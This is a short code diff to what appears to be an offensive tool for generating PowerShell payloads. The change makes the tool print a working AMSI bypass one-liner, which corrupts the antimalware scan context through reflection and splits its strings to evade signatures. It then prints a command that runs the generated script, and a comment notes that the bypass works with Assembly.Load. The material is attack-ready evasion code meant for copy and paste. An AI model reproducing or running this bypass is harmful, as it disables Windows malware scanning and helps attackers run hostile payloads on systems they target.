@@ -280,8 +280,15 @@ def main(
         ]
         result = run(ps1_data, resolved_ps1, ps1_config, output_path=str(output))
         output.write_bytes(result)
-        write_hint("run AMSI bypass first, then: powershell -ep bypass -File "
-                    + str(output))
+        # Print AMSI bypass (context corruption) for copy-paste.
+        # Context bypass works for Assembly.Load unlike amsiInitFailed.
+        write_hint(
+            "$u=[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');"
+            "$u.GetField('amsi'+'Context','NonPublic,Static')"
+            ".SetValue($null,[IntPtr][Runtime.InteropServices.Marshal]::AllocHGlobal(4));"
+            "$u.GetField('amsi'+'Session','NonPublic,Static').SetValue($null,$null)"
+        )
+        write_hint(f". {output} [args]")
         raise typer.Exit()
 
     if clm_bypass and pipe_type == PipelineType.PS1:
